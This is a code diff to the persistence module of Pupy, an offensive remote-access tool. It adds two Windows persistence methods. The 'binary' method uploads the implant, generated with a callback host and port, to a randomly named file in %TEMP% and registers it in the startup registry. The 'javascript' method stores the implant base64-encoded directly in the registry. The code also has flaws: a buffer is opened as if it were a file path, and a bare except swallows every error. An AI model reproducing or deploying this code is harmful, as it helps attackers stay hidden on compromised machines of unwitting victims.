@@ -27,7 +27,7 @@ class PersistenceModule(PupyModule):
 	def init_argparse(self):
 		self.arg_parser = PupyArgumentParser(prog="persistence", description=self.__doc__)
 		self.arg_parser.add_argument('-e','--exe', help='Use an alternative file and set persistency', completer=path_completer)
-		self.arg_parser.add_argument('-m','--method', choices=['registry'], required=True, help='persistence method')
+		self.arg_parser.add_argument('-m','--method', choices=['javascript','binary'], required=True, help='persistence method: javascript option aims to load a b64 encoded directly into the registry [experimental]; binary option aims to save a copy in the %TEMP% folder location and add to registry')
 
 	@windows_only
 	def is_compatible(self):
@@ -49,15 +49,13 @@ class PersistenceModule(PupyModule):
 				exebuff=pupygen.get_edit_pupyx64_exe(host, port)
 			else:
 				exebuff=pupygen.get_edit_pupyx86_exe(host, port)
-		if args.method=="registry":
+		try:
 			self.client.load_package("pupwinutils.persistence")
 
-
-
-			remote_path=self.client.conn.modules['os.path'].expandvars("%TEMP%\\{}.exe".format(''.join([random.choice(string.ascii_lowercase) for x in range(0,random.randint(6,12))])))
-			self.info("uploading to %s ..."%remote_path)
+			reg_data=self.client.conn.modules['os.path'].expandvars("%TEMP%\\{}.exe".format(''.join([random.choice(string.ascii_lowercase) for x in range(0,random.randint(6,12))])))
+			self.info("uploading to %s ..."%reg_data)
 			#uploading
-			rf=self.client.conn.builtin.open(remote_path, "wb")
+			rf=self.client.conn.builtin.open(reg_data, "wb")
 			chunk_size=16000
 			pos=0
 			while True:
@@ -68,13 +66,21 @@ class PersistenceModule(PupyModule):
 				pos+=chunk_size
 			rf.close()
 			self.success("upload successful")
-
-			#adding persistency
 			self.info("adding to registry ...")
-			self.client.conn.modules['pupwinutils.persistence'].add_registry_startup(remote_path)
+
+			if args.method=="javascript":
+				#encoding binary
+				with open(exebuff, 'rb') as f:
+					encoded = base64.b64encode(f.read())
+				f.close()
+
+				#check registry for entry
+				self.client.conn.modules['pupwinutils.persistence'].add_javascript_startup(encoded)
+			elif args.method=="binary":
+				#adding persistency
+				self.client.conn.modules['pupwinutils.persistence'].add_registry_startup(reg_data)
+
 			self.info("registry key added")
-
 			self.success("persistence added !")
-		else:
+		except:
 			self.error("method not implemented")
-
